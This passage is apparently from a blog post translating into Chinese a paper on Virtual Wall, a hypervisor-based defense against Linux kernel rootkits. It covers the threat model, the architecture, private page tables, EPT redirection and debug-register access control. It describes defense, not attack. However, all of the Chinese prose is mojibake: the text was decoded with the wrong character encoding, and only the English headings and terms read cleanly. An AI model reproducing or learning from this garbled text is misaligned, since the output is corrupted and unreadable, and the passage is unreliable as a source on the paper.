¸æ•°æ®ç»“æ„ä½œä¸ºæ¨¡æ¿æ¥ç†è§£å†…å­˜æ‰€è¡¨ç¤ºçš„æ“ä½œæ€§çŠ¶æ€ã€‚</p><p>ä¸ VMwatcher ä¸åŒï¼ŒRTKDSM ä¸ºä¸€ä¸ªå®æ—¶ç³»ç»Ÿï¼Œå…¶å¯ä»¥è¢«åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šå†…çœä»£ç†ä¸ç›‘æ§ä»£ç†ï¼Œå‰è€…æ”¾ç½®åœ¨ä¸€ä¸ªå®‰å…¨çš„è™šæ‹Ÿæœºä¸­ï¼Œåè€…åˆ™æ”¾ç½®åœ¨ hypervisor ä¸­ã€‚RTKDSM å¯ä»¥é€šè¿‡äº¤å‰å¯¹æ¯”æ¥å¯¹æ•°æ®ç»“æ„è¿›è¡Œå®æ—¶ç›‘æ§ã€‚</p><p>ä¸Šè¿°æ–¹æ³•å¯ä»¥è¢«ç”¨ä»¥æ£€æµ‹è¢«å†…æ ¸ rootkits éšè—çš„å¯¹è±¡ï¼Œç„¶è€Œè¿™äº›æ–¹æ³•åŸºäºå¦‚ Xen çš„å·¨å‹è™šæ‹ŸåŒ–å¹³å°ï¼Œä¸”éœ€è¦å…‹æœè™šæ‹Ÿæœºå†…çœçš„è¯­ä¹‰ç¼ºé™·ã€‚ç»“æœä¾¿æ˜¯ï¼Œä»–ä»¬å‘æ“ä½œç³»ç»Ÿå¼•å…¥äº†ä¸€ä¸ªæ˜¾è‘—çš„æ€§èƒ½å¼€é”€ã€‚</p><p>ä¾‹å¦‚ï¼ŒRTKDSMé™ä½äº†ä¸€äº›åº”ç”¨ 110% çš„æ‰§è¡Œé€Ÿåº¦ã€‚SYRING åœ¨ç³»ç»Ÿè°ƒç”¨ä¸Šå»¶è¿Ÿåˆ° 51msï¼Œè¿™å¯¹ç³»ç»Ÿè°ƒç”¨è€Œè¨€æ˜¯ä¸€ä¸ªæ˜¾è‘—çš„æ€§èƒ½å¼€é”€ã€‚é™¤äº† RTKDSMï¼Œæ²¡æœ‰ä»»ä½•çš„ä¸Šè¿°æ–¹æ³•å¯ä»¥å®æ—¶ç›‘æ§ä¸æ£€æµ‹æ“ä½œç³»ç»Ÿã€‚</p><h1 id="3-Virtual-Wall-Architecture"><a href="#3-Virtual-Wall-Architecture" class="headerlink" title="3 Virtual Wall Architecture"></a>3 Virtual Wall Architecture</h1><p>VTW æ˜¯ä¸€ä¸ªå¸¦æœ‰å†…æ ¸ rootkit é˜²æŠ¤åŠŸèƒ½çš„è½»é‡çº§ hypervisorã€‚æœ¬èŠ‚æˆ‘ä»¬å°†ä»‹ç»å…¶æ€»ä½“æ¶æ„ã€‚</p><h2 id="3-1-Assumptions-and-Notational-Definition"><a href="#3-1-Assumptions-and-Notational-Definition" class="headerlink" title="3.1 Assumptions and Notational Definition"></a>3.1 Assumptions and Notational Definition</h2><p>æˆ‘ä»¬å‡è®¾æ”»å‡»è€…å¯ä»¥å°†ä¸€ä¸ª LKM æ³¨å…¥åˆ° TOS ä¸­ã€‚ç°å®ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åº”ç”¨æ¼æ´æé«˜æƒé™å¹¶é€šè¿‡åé—¨æ¥æ§åˆ¶ TOSï¼Œä¹‹åä¸€ä¸ª LKM å¯ä»¥è¢«æ³¨å…¥åˆ°å†…æ ¸ã€‚æˆ‘ä»¬åŒæ ·å‡è®¾ TOS ä¸éæ¶æ„æ‰§è¡Œå®ä½“ä¸ä¼šéæ³•ç¯¡æ”¹å†…æ ¸æ•°æ®ä¸å†…æ ¸æ§åˆ¶æµã€‚æ­¤å¤–ï¼Œæœ¬è®ºæ–‡æ‰€ç”¨å®šä¹‰å±•ç¤ºäºè¡¨ 1 ä¸­ã€‚</p><h2 id="3-2-Design-Objectives"><a href="#3-2-Design-Objectives" class="headerlink" title="3.2 Design Objectives"></a>3.2 Design Objectives</h2><p>VTW è¢«è®¾è®¡ä¸ºå¸¦æœ‰å¦‚ä¸‹æŒ‡å®šçš„ä¸‰ä¸ªæŠ€æœ¯éœ€æ±‚ï¼š</p><p>1ï¼‰ <em>å®æ—¶æ£€æµ‹</em> ï¼ˆReal-time Detectionï¼‰ã€‚å†…æ ¸ rootkits å¯èƒ½åœ¨æ¨¡å—åŠ è½½é˜¶æ®µå¯åŠ¨ä¸€æ¬¡æ”»å‡»ï¼Œæˆ–æ˜¯åœ¨æ¨¡å—ä½äºå†…å­˜ä¸­çš„æ—¶é—´ä¸­çš„ä»»ä½•æ—¶é—´ã€‚è‹¥æ£€æµ‹åœ¨ LKM è¢«è½½å…¥åæˆ–è¢«ç§»é™¤åå®Œæˆï¼Œåˆ™æ£€æµ‹ç»“æœå¯èƒ½ä¸ç²¾ç¡®ï¼Œæµ™æ±Ÿå½±å“åç»­çš„æ£€æµ‹ä¸è¿½è¸ªã€‚å› æ­¤ï¼ŒVTW éœ€è¦åœ¨æ¨¡å—è½½å…¥å®Œæˆå‰æˆ–åœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­æ£€æµ‹ rootkits çš„æœ‰å®³æ“ä½œä»¥ä¿æŠ¤å†…æ ¸æ•°æ®çš„å®Œæ•´æ€§ã€‚</p><p>2ï¼‰ <em>é«˜æ•ˆé˜²æŠ¤</em> ï¼ˆEffective Defenceï¼‰ã€‚rootkits æ“ä½œçš„å†…æ ¸å¯¹è±¡åŒ…æ‹¬é™æ€ä¸åŠ¨æ€çš„å†…æ ¸æ•°æ®ã€‚å¯¹äºé™æ€å†…æ ¸æ•°æ®ï¼ŒVTW éœ€è¦ç¡®è®¤ä»–ä»¬æœªè¢«ç¯¡æ”¹ã€‚å¯¹äºåŠ¨æ€å†…æ ¸æ•°æ®ï¼ŒVTW éœ€è¦ç¡®ä¿ä»–ä»¬åœ¨è¢«ç¯¡æ”¹åå¯ä»¥è¢«æ¢å¤ã€‚</p><p>3ï¼‰ <em>ç»¼åˆå¯è¿½è¸ªæ€§</em> ï¼ˆComprehensive Traceabilityï¼‰ã€‚æ”»å‡»ä»£ç å¯èƒ½åœ¨ rootkit æ‰€å±å†…å­˜ç©ºé—´ä¸­ï¼Œä¹Ÿå¯èƒ½åœ¨ rootkit æ‰€ä¾èµ–çš„å…¶ä»–æ¨¡å—çš„ä»£ç ç©ºé—´ä¸­ã€‚VTW éœ€è¦å®šä½æ‰€æœ‰ä¸å½“å‰æœ‰å®³æ“ä½œç›¸å…³çš„ LKMsã€‚</p><h2 id="3-3-System-Architecture-of-Virtual-Wall"><a href="#3-3-System-Architecture-of-Virtual-Wall" class="headerlink" title="3.3 System Architecture of Virtual Wall"></a>3.3 System Architecture of Virtual Wall</h2><p>VTW çš„é˜²æŠ¤è¿‡ç¨‹å¦‚ å›¾.1 æ‰€ç¤ºã€‚é˜²å¾¡æ¨¡å¼éœ€è¦é€šè¿‡åˆå§‹åŒ–æ¥å»ºç«‹ï¼Œä¹‹ååº”ç”¨è®¿é—®æ§åˆ¶æ–¹æ¡ˆï¼Œæœ€ååŒæ—¶è¿å¸¦å®Œæˆæ£€æµ‹ä¸è·Ÿè¸ªä»¥åœ¨ rootkit è¿‡æ»¤ä¸­è¿›è¡Œé«˜é€Ÿå†³å®šã€‚</p><p><img src="https://s2.loli.net/2023/04/06/XyHTQfdiP9YZk7S.png" alt="å›¾.1 virtual wall æ“ä½œè¿‡ç¨‹"></p><p>VTW çš„æ¶æ„å¦‚ å›¾.2 æ‰€ç¤ºã€‚VTW ç”± ModeHandlerã€MemHandlerã€ControlHandlerã€SPEï¼ˆSecurity Policy Engineï¼Œå®‰å…¨ç­–ç•¥å¼•æ“ï¼‰ç»„æˆã€‚ModeHandler çš„ä»»åŠ¡æ˜¯ç¡®ä¿åœ¨ â€œguestâ€ ä¸ â€œhostâ€ æ¨¡å¼ä¹‹é—´çš„æ­£å¸¸æ¨¡å¼åˆ‡æ¢ã€‚</p><p><img src="https://s2.loli.net/2023/04/06/ZrhVFxDmM3gERbI.png" alt="å›¾.2 VTW é˜²æŠ¤ç³»ç»Ÿæ¶æ„"></p><p>MemHandle çš„ä»»åŠ¡æ˜¯é€šè¿‡å»ºç«‹ä¸€ç»„ç‹¬ç«‹çš„åœ°å€é¡µè¡¨æ¥ä» â€œguestâ€ ä¸Šéš”ç¦»å®‰å…¨å†…å®¹ç‰©ã€‚æ­¤å¤–ï¼Œå…¶å€Ÿç”¨ EPT ï¼ˆè¯‘æ³¨ï¼šExtend Page Tableï¼Œæ‰©å±•é¡µè¡¨ï¼‰æ¥å®ç° VTW çš„è‡ªæˆ‘é˜²æŠ¤ä¸é€æ˜éƒ¨ç½²ã€‚ControlHandler å®Œæˆ rootkit çš„æ£€æµ‹ã€é¢„é˜²ã€åˆ†æã€‚</p><p>SPE ä¸ºæ¯ä¸ªå†…å®¹ç‰©æä¾›å®‰å…¨ç­–ç•¥ï¼Œä¾‹å¦‚ä¸ºé™æ€å†…æ ¸æ•°æ®æä¾›æƒé™è®¾ç½®ã€ä¸ºåŠ¨æ€å†…æ ¸æ•°æ®æä¾›åˆæ³•æ€§çº¦æŸã€ä¸ºæ§åˆ¶æµæä¾›è¿½è¸ªè·¯å¾„ã€‚æ‰€æœ‰å¯¹ SPE çš„æŸåéƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿä» â€œguestâ€ é™·å…¥ â€œhostâ€ã€‚</p><h3 id="3-3-1-Resetting-of-OSâ€™s-Privilege-Mode"><a href="#3-3-1-Resetting-of-OSâ€™s-Privilege-Mode" class="headerlink" title="3.3.1 Resetting of OSâ€™s Privilege Mode"></a>3.3.1 Resetting of OSâ€™s Privilege Mode</h3><p>ModeHandler ä½¿ç”¨ Intel VMX Non-Root ä¸ Intel VMX Root æ¥å°†åŸç”Ÿæ“ä½œç³»ç»Ÿåˆ†ä¸º â€œguestâ€ ä¸ â€œhostâ€ æ¨¡å¼ã€‚è¿™ä¸¤ç§æ¨¡å¼å°† ring0 åˆ†ä¸ºä¸¤ä¸ªç‰¹æƒçº§ï¼Œç§°ä¸ºå®Œå…¨å‹ ring0 ä¸é™åˆ¶å‹ ring0ã€‚åœ¨ â€œhostâ€ æ¨¡å¼ä¸‹ï¼ŒVTW ä½äºå®Œå…¨å‹ ring0 çº§ï¼Œå¯ä»¥å®Œå…¨æ¥ç®¡å†…æ ¸æ§åˆ¶æµã€‚åœ¨ â€œguestâ€ æ¨¡å¼ä¸‹ï¼Œå†…æ ¸ä½äºé™åˆ¶å‹ ring0 çº§ï¼Œä»»ä½•æŸå SPE çš„è¡Œä¸ºéƒ½å°†é€ æˆæ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ æ¨¡å¼ã€‚</p><p>åœ¨ å›¾.3 ä¸­ï¼ŒProtectionWallä¸º ModeHandler ä¸ MemHandler çš„åŠŸèƒ½å±æ€§çš„æŠ½è±¡ï¼ŒKernelProtector ä¸º ControlHandler çš„åŠŸèƒ½å±æ€§çš„æŠ½è±¡ã€‚</p><p>è‹¥ guest æ¨¡å¼ä¸‹çš„ä¸€æ¡æŒ‡ä»¤ä¼šæŸåå®‰å…¨ç­–ç•¥ï¼Œåˆ™å…¶å°†é€ æˆæ“ä½œç³»ç»Ÿåˆ‡æ¢åˆ° host æ¨¡å¼ã€‚ProtectionWall å°†æ‹’ç»æ‰€æœ‰åœ¨ guest æ¨¡å¼ä¸‹çš„æ“ä½œå¹¶å”¤é†’ KernelProtector ä½¿ç”¨ SPE å¤„ç†è¯¥æ”»å‡»ã€‚</p><p><img src="https://s2.loli.net/2023/04/06/Qt4skOVGPNJcLS2.png" alt="å›¾3. Linux å†…æ ¸æ“ä½œä¸­åœ¨ guest ä¸ host æ¨¡å¼é—´çš„æ¡ä»¶è·³è½¬"></p><h3 id="3-3-2-Creating-Private-Page-Tables"><a href="#3-3-2-Creating-Private-Page-Tables" class="headerlink" title="3.3.2 Creating Private Page Tables"></a>3.3.2 Creating Private Page Tables</h3><p>MemHandler ä¸º host åˆ›å»ºä¸€ç»„ç§æœ‰é¡µè¡¨ä»¥åˆ†å‰²ä¸¤ç§æ¨¡å¼çš„åœ°å€ç©ºé—´ï¼Œç§æœ‰é¡µè¡¨çš„åˆ›å»ºæ¡ä»¶å¦‚ è¡¨2 æ‰€ç¤ºã€‚</p><p>å­˜å‚¨ä¸å†…æ ¸æ•°æ®æ®µä¸­çš„å†…æ ¸æ•°æ® $swapper_pg_dir$ æŒ‡å‘å†…æ ¸åœ°å€ç©ºé—´çš„é¡µç›®å½•ï¼Œæ‰€æœ‰æ‰§è¡Œå®ä½“çš„å†…æ ¸åœ°å€ç©ºé—´åŸºäº $swapper_pg_dir$ æ„å»ºã€‚åœ¨ è¡¨2 ä¸­ï¼Œæ‰€æœ‰ç§æœ‰é¡µè¡¨ç»„æˆä¸€ä¸ªå…ƒç»„ $\rho$  ï¼Œä¸”æ‰€æœ‰ç”± $swapper_pg_dir$ æŒ‡å‘çš„é¡µè¡¨ç»„æˆä¸€ä¸ªå…ƒç»„ $\varepsilon$ ï¼ˆâ‘ ~â‘¡ï¼‰ã€‚</p><p>å½“ MemHandler è¢«åˆå§‹åŒ–ï¼Œå…¶ä¼šæ ¹æ® $\varepsilon$ åˆ›å»ºé¡µç›®å½•è¡¨ï¼ˆ$h_pml4e$ï¼‰ã€é¡µé¡¶çº§ç›®å½•ï¼ˆ$h_pdpte$ï¼‰ã€é¡µä¸­é—´ç›®å½•ï¼ˆ$h_pde$ï¼‰ã€é¡µè¡¨ï¼ˆ$h_pe$ï¼‰ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆåŸºäºé¡µè¡¨é›† $\rho$ ï¼ˆâ‘¢ï¼‰çš„å†…å­˜ $V_{22}$ åˆ›å»ºä¸€ä»½ç­‰é‡çš„å†…å­˜ $V_{1}$ ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨æ¯ä¸ª $h_pdpte$ çš„ç‰©ç†å†…å­˜å¡«å…… $h_pml4e$ çš„æ¡ç›®ã€ä½¿ç”¨æ¯ä¸ª $h_pde$ çš„ç‰©ç†å†…å­˜å¡«å…… $h_pdpte$ çš„æ¡ç›®ã€ä½¿ç”¨æ¯ä¸ª $h_pe$ çš„ç‰©ç†å†…å­˜å¡«å…… $h_pde$ çš„æ¡ç›®ã€‚</p><p>æœ€åï¼ŒMemHandler æ‹·è´ $\varepsilon$ çš„æœ€åçš„é¡µè¡¨ä¸­æ‰€æœ‰çš„é¡µæ¡ç›®è‡³ $h_pe$ ã€‚å½“ â€œhostâ€ ä¸­å‡ºç°ä¸€ä¸ªé¡µè¡¨é”™è¯¯æ—¶ï¼ŒVTW æ ¹æ® $\varepsilon$ æ›´æ–°é”™è¯¯çš„é¡µè¡¨ã€‚</p><p>ä¸ºäº†ç¡®ä¿ VTW çš„é€æ˜æ€§ï¼ŒMenHandler å»ºç«‹äº†ä¸€ç§ EPT é‡å®šå‘æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä½¿å¾— VTW çš„å†…å®¹å¯¹ â€œguestâ€ è€Œè¨€æ˜¯ä¸å¯è§çš„ã€‚å…¶æ ¹æ® VTW çš„æ¯ä¸ªå†…å®¹ç‰©çš„ç‰©ç†å†…å­˜é‡å®šå‘ EPT çš„é¡µè¡¨é¡¹è‡³ä¸€ä¸ªè¢«è®¾ä¸ºå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œï¼ˆâ‘§~â‘©ï¼‰çš„ç©ºé¡µã€‚å½“ â€œguestâ€ ä¸­çš„å®ä½“æƒ³è¦è®¿é—® VTW çš„ç‰©ç†å†…å­˜æ—¶ï¼Œè¢«è®¿é—®çš„å†…å­˜ä¸ºä¸€ä¸ª <em>â€œ$ä¼ªé¡µ$â€</em> ï¼ˆpseudo pageï¼‰ã€‚</p><p>ç”±äºæ•´ä¸ªå†…æ ¸å…±äº«ä¸€ä¸ªç›¸åŒçš„åœ°å€ç©ºé—´ï¼Œæ¯ä¸ªæ‰§è¡Œå®ä½“å¯ä»¥æ˜ å°„åŒ…æ‹¬ VTW åœ¨å†…çš„æ‰€æœ‰å†…æ ¸å†…å®¹ã€‚å› æ­¤ï¼ŒVTW ä¸éœ€è¦ä»»ä½•è¿‡ç¨‹ä¾¿èƒ½è¢«æ£€æµ‹ä¸åˆ†æã€‚è‹¥æˆ‘ä»¬ä»…ä»…åˆ é™¤äº†å¯»å€ VTW çš„ EPT æ¡ç›®ï¼Œåˆ™å½“ä¸€ä¸ªå®ä½“æ¢ç´¢å†…æ ¸åœ°å€ç©ºé—´æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°†ä¸æ–­åœ°é™·å…¥ â€œhostâ€ã€‚</p><p>ä¸€æ–¹é¢ï¼Œé¢‘ç¹çš„é™·å…¥å°†å½±å“æ‰§è¡Œæ•ˆç‡ï¼›å¦ä¸€æ–¹é¢ï¼Œå¼‚å¸¸çš„å†…å­˜è®¿é—®æ—¶é—´ä¸ç©ºé—´å°†ä½¿å¾—æ”»å‡»è€…æ¨æ–­å‡º VTW çš„å­˜åœ¨ã€‚å°† VTW çš„æ‰€æœ‰åœ°å€ç©ºé—´é‡å®šå‘è‡³ä¼ªç‰©ç†é¡µé¢å¯ä»¥æ’é™¤ç”±å†…å­˜æ¢æµ‹é€ æˆçš„æ—¶é—´ä¸ç©ºé—´å¼‚å¸¸ï¼Œè¿™å¢å¼ºäº† VTW çš„é€æ˜æ€§ã€‚</p><h1 id="4-Resource-Access-Control"><a href="#4-Resource-Access-Control" class="headerlink" title="4 Resource Access Control"></a>4 Resource Access Control</h1><p>VTW é€šè¿‡ MemHandler æ§åˆ¶å†…å­˜è®¿é—®ã€‚MenHandler ä½¿ç”¨ EPT æ¥æ§åˆ¶ â€œguestâ€ æ¨¡å¼ä¸­çš„å†…å­˜è®¿é—®ã€‚é€šè¿‡ EPT æä¾›çš„å†…å­˜æƒé™ç®¡ç†ï¼Œæˆ‘ä»¬å¯ä»¥æ„ŸçŸ¥ã€è·Ÿè¸ªã€æ§åˆ¶ â€œguestâ€ å¯¹æ‰€æœ‰å†…å­˜é¡µé¢çš„è®¿é—®ã€‚MenHandler å¯ä»¥éå¸¸ç®€ä¾¿åœ°é€šè¿‡è®¾ç½® EPT æœ€åä¸€çº§çš„æƒé™ä½æ¥éƒ¨ç½²ã€‚</p><p>ä¸ºäº†è¾¾æˆå¯¹å†…æ ¸æ›´ç»†ç²’åº¦çš„è®¿é—®æ§åˆ¶ï¼ŒControlHandler å»ºç«‹äº†ä¸€ä¸ªåŒ…æ‹¬è®¾ç½®æ–­ç‚¹ã€æ³¨å…¥é€šç”¨ä¿æŠ¤å¼‚å¸¸ã€æ‰§è¡Œå•æ­¥è°ƒè¯•çš„äº‹ä»¶æ³¨å…¥æœºåˆ¶ã€‚æˆ‘ä»¬å°†åœ¨æœ¬èŠ‚æè¿°è¿™äº›ï¼Œå¹¶å±•ç¤ºäº è¡¨3 ä¸ â€œèµ„æºè®¿é—®æ§åˆ¶è¿‡ç¨‹â€ï¼ˆResource Access Control Procedureï¼‰ã€‚</p><h2 id="4-1-Conditioning-for-Resource-Access-Control"><a href="#4-1-Conditioning-for-Resource-Access-Control" class="headerlink" title="4.1 Conditioning for Resource Access Control"></a>4.1 Conditioning for Resource Access Control</h2><p>è¡¨3 ä¸ºè®¾ç½®èµ„æºè®¿é—®æ§åˆ¶çš„æ¡ä»¶ã€‚â‘ <del>â‘¨ç”¨äºè®¾ç½®æ–­ç‚¹ï¼Œæ–­ç‚¹çš„ç±»å‹å¯ä»¥ä¾æ®ç›®æ ‡å¯¹è±¡åˆ†ä¸ºæŒ‡ä»¤ä¸æ•°æ®æ–­ç‚¹ã€‚ControlHandler ä½¿ç”¨ Dr0</del>Dr3ï¼ˆæ–­ç‚¹åœ°å€å¯„å­˜å™¨äºé›†åˆ $DeReg$ ä¸­ï¼‰ä¸ DR6<del>DR7 ï¼ˆæ–­ç‚¹ç®¡ç†å¯„å­˜å™¨ï¼Œäºé›†åˆ $DeCon$ ä¸­ï¼‰æ¥è®¾ç½®ä¸åŒç±»å‹çš„æ–­ç‚¹ï¼ˆâ‘ </del>â‘¡ï¼‰ã€‚</p><p>åœ¨è®¾ç½®ä¸€ä¸ªæŒ‡ä»¤æ–­ç‚¹æ—¶ï¼Œé¦–å…ˆé€šè¿‡å‡½æ•° $SetDeReg$ å°†æŒ‡ä»¤åœ°å€ï¼ˆ $Iaddr$ ï¼‰å†™å…¥åˆ°æ–­ç‚¹åœ°å€å¯„å­˜å™¨ï¼ˆâ‘¢ï¼‰ï¼Œæ¥ä¸‹æ¥ Dr7 å¯¹åº”çš„ R&#x2F;W ä½è¢«è®¾ç½®ä¸º 01ï¼ˆæ•°æ®å†™ä¸­æ–­ï¼‰ï¼Œå¯¹åº”çš„ LEN ä½è¢«è®¾ç½®ä¸º 10 ï¼ˆæ•°æ®å¤§å°ä¸º 8 å­—èŠ‚ï¼‰ï¼Œå¦‚ â‘¦<del>â‘§æ‰€ç¤ºã€‚åœ¨å®Œæˆæ–­ç‚¹è®¾ç½®ä¹‹åï¼ŒControlHandler åŒæ ·éœ€è¦æ¸…é™¤ Dr6 ï¼ˆâ‘¨ï¼‰çš„ B0</del>B2 ï¼ˆä½ 2:0)ã€‚</p><p>ä¸ºäº†æ§åˆ¶ â€œguestâ€ çš„æ‰§è¡Œï¼ŒControlHandler ä¸ºæ“ä½œç³»ç»Ÿè®¾ç½®å•æ­¥æ‰§è¡Œè°ƒè¯•ã€‚ControlHandler é¦–å…ˆè¯»å– VMCS ä¸­ guest çŠ¶æ€åŸŸä¸­çš„ EFLAGS çš„å†…å®¹ï¼Œè®°å½•ç›®æ ‡ä¿¡æ¯ï¼ˆâ‘¬ï¼‰ã€‚æ¥ä¸‹æ¥å…¶å°† EFLAGS.TF ï¼ˆé™·é˜±æ ‡å¿—ä½ï¼‰è®¾ç½®ä¸º1ï¼ˆâ‘­ï¼‰ï¼Œè¿™å°†å¤„ç†å™¨è®¾ä¸ºå•æ­¥æ‰§è¡Œæ¨¡å¼ã€‚æœ€åï¼ŒControlHandler å°†ä¿®æ”¹åçš„å†…å®¹å†æ¬¡å†™å…¥ EFLAGSã€‚æœ€å Dr6 çš„ BSï¼ˆä½ 14ï¼‰è¢«è®¾ä¸º 0ã€‚</p><h2 id="4-2-Resource-Access-Control-Procedure"><a href="#4-2-Resource-Access-Control-Procedure" class="headerlink" title="4.2 Resource Access Control Procedure"></a>4.2 Resource Access Control Procedure</h2><p>è¯¥ç¨‹åºç”¨ä»¥æ§åˆ¶æŒ‡ä»¤æ‰§è¡Œä¸æ•°æ®è®¿é—®ã€‚æ­¥éª¤ 1<del>4ç”¨ä»¥è·å¾—æ–­ç‚¹ï¼Œæ­¥éª¤ 5</del>6 ç”¨ä»¥å µå¡ â€œguestâ€ ä¸­çš„ç›®æ ‡æŒ‡ä»¤ï¼Œæ­¥éª¤ 7~8 ç”¨ä»¥åœ¨æ‰§è¡Œç›®æ ‡æŒ‡ä»¤åè·å–æ“ä½œç³»ç»Ÿçš„çŠ¶æ€ã€‚</p><p><img src="https://s2.loli.net/2023/04/08/OVLpw5DtBHcr4PJ.png" alt="image.png"></p><p>å½“ä¸€ä¸ªæ‰§è¡Œå®ä½“åƒä¸€ä¸ªæ–­ç‚¹ä½ç½®å†™å…¥æ•°æ®ï¼ˆæ­¥éª¤1<del>2ï¼‰æˆ–æ˜¯åœ¨ â€œguestâ€ æ¨¡å¼ä¸‹æ‰§è¡Œä¸€ä¸ªæ–­ç‚¹æŒ‡ä»¤ï¼ˆæ­¥éª¤ 3</del>4ï¼‰ï¼Œå…¶ä¼šè§¦å‘åˆ° â€œhostâ€ æ¨¡å¼çš„æ¨¡å¼åˆ‡æ¢ï¼ˆ$SysMod$ï¼‰ã€‚Dr6 ä¸­çš„ B0 ~ B2 è¢«ç”¨ä»¥åŒºåˆ†æ–­ç‚¹çš„ä½ç½®ã€‚é€šè¿‡è®¾ç½®æ–­ç‚¹ï¼ŒVTW å®ç°äº†å­—èŠ‚çº§åˆ«çš„èµ„æºè®¿é—®ã€‚</p><p>å½“ä¸€ä¸ªé€šç”¨ä¿æŠ¤è¢«è®¾ç½®ï¼Œè¿è¡Œåœ¨ â€œguestâ€ æ¨¡å¼ä¸‹çš„æ“ä½œç³»ç»Ÿå°†ç”Ÿæˆä¸€ä¸ª #GP å¼‚å¸¸ï¼Œç”±æ­¤å½“å‰æ“ä½œå°†ä¼šè¢«é˜»å¡ï¼ˆæ­¥éª¤ 5~6ï¼‰ã€‚å½“å•æ­¥è°ƒè¯•å¯ç”¨ï¼Œæ“ä½œç³»ç»Ÿå°†åœ¨ â€œguestâ€ ä¸‹æ‰§è¡Œä»»æ„æŒ‡ä»¤åè§¦å‘ä¸€ä¸ªè°ƒè¯•å¼‚å¸¸å¹¶é™·å…¥åˆ° â€œhostâ€ ï¼ˆæ­¥éª¤ 7 ~ 8 ï¼‰ã€‚é€šè¿‡è®¾ç½®å•æ­¥è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ“ä½œç³»ç»Ÿå®ç°æŒ‡ä»¤ç²’åº¦çš„èµ„æºè®¿é—®æ§åˆ¶ï¼Œå¹¶é€šè¿‡ $get_status$ è·å¾—ç”±æ¯æ¡æŒ‡ä»¤æ‰€é€ æˆçš„å¯¹æ“ä½œç³»ç»ŸçŠ¶æ€çš„æ”¹å˜ã€‚</p><h1 id="5-Rootkit-Defense-Strategies"><a href="#5-Rootkit-Defense-Strategies" class="headerlink" title="5 Rootkit Defense Strategies"></a>5 Rootkit Defense Strategies</h1><p>æˆ‘ä»¬ä¾æ®æ”»å‡»æ—¶é—´å°†å†…æ ¸ rootkits çš„æ”»å‡»åˆ†ä¸ºä¸‰ç±»ã€‚ç¬¬ä¸€ç±»ä¸­ rootkits åœ¨åŠ è½½æ—¶æ”»å‡»å†…æ ¸ï¼Œå…¶ä¼šé€šè¿‡ $module_init()$ è°ƒç”¨ç‰¹å®šå‡½æ•°ä»¥å®ç°ä»–ä»¬çš„æ”»å‡»ã€‚</p><p>å†…æ ¸ rootkits çš„æœ‰å®³è¡Œä¸ºå¯èƒ½åœ¨ä»¥ä¸Šä¸‰ç±»æ”»å‡»ä¸­çš„å…¶ä¸€æˆ–æ•°ä¸ªä¸­å‡ºç°ï¼ŒåŒæ—¶ä¸å½“å‰æ”»å‡»æ‰€å…³è”çš„ rootkit(s) å¯èƒ½ä¼šæ˜¯æ­£åœ¨è¢«åŠ è½½çš„ LKMã€å·²åŠ è½½çš„ LKMï¼ŒæŠ‘æˆ–ä¸¤è€…éƒ½æ˜¯ã€‚</p><p>VTW å†³å®šä¸€ä¸ª LKM æ˜¯å¦ä¸ºä¸€ä¸ªå†…æ ¸ rootkitã€‚å¯¹äºå†…æ ¸ rootkitsï¼ŒVTW é€šè¿‡é˜»å¡ä»–ä»¬çš„ç ´åè¡Œä¸ºå¹¶æ¢å¤è¢«ç ´åçš„æ•°æ®æ¥å¯¹æŠ—ä»–ä»¬ã€‚rootkit æ£€æµ‹æ–¹æ³•å¦‚ â€œRootkit æ”»å‡»æ£€æµ‹â€ æ‰€ç¤ºï¼Œæ¡ä»¶è®¾ç½®å±•ç¤ºäº è¡¨4 ä¸­ã€‚è¯¥æ–¹æ³•å¯ä»¥è¢«ç”¨ä»¥é¢„æ£€æµ‹é™æ€ä¸åŠ¨æ€çš„å†…æ ¸å¯¹è±¡ã€‚</p><p><img src="https://s2.loli.net/2023/04/08/pX1lVcQrSfg5wiK.png" alt="image.png"></p><p><em>Rootkit æ”»å‡»æ£€æµ‹</em> ï¼ˆDetection of Rootkit Attacksï¼‰ã€‚å…¶è¢«ç”¨ä»¥æ£€æµ‹å†…æ ¸ rootkit å¹¶ä¿æŠ¤å†…æ ¸ä¸è¢«æ‘§æ¯ã€‚æ­¥éª¤ 1 ~ 5 ç”¨äºé™æ€å†…æ ¸å¯¹è±¡ä¿æŠ¤ï¼Œæ­¥éª¤ 6 ~ 8 ç”¨äºéšè—æ£€æµ‹ï¼Œæ­¥éª¤ 9 ~ 11 ç”¨äºåŠ¨æ€å†…æ ¸å¯¹è±¡ä¿æŠ¤ã€‚</p><p><img src="https://s2.loli.net/2023/04/08/PvFmjXe2TyQLi4K.png" alt="image.png"></p><h2 id="5-1-Static-Kernel-Object-Protection"><a href="#5-1-Static-Kernel-Object-Protection" class="headerlink" title="5.1 Static Kernel Object Protection"></a>5.1 Static Kernel Object Protection</h2><p>é™æ€å†…æ ¸å¯¹è±¡ï¼ˆ$\mu$ ä¸ $\xi$ï¼‰åœ¨æ“ä½œç³»ç»Ÿä¸­ä¿æŒä¸è¢«æ”¹å˜ã€‚ç‰¹å®šçš„å†…æ ¸æ§åˆ¶æµæ‰§è¡Œè·¯å¾„ä¸ä¸€äº›é‡è¦çš„æ•°æ®è¢«å­˜æ”¾äºé™æ€å†…æ ¸å¯¹è±¡ä¸­ã€‚å†…æ ¸ rootkits å¯ä»¥é€šè¿‡ç ´åé™æ€å†…æ ¸å¯¹è±¡çš„å®Œæ•´æ€§æ¥è¾¾æˆä»–ä»¬çš„æ¶æ„ç›®çš„ã€‚</p><p>ä¸ºäº†ä¿æŠ¤é™æ€å†…æ ¸å¯¹è±¡ï¼ˆå¦‚æ“ä½œç³»ç»Ÿä»£ç æ®µã€æ•°æ®æ®µã€ç³»ç»Ÿè°ƒç”¨è¡¨ç­‰ï¼‰ï¼ŒVTW é€šè¿‡åˆ†ææ–‡ä»¶ $â€System.mapâ€$ æˆ–ä»å†…æ ¸ä»£ç 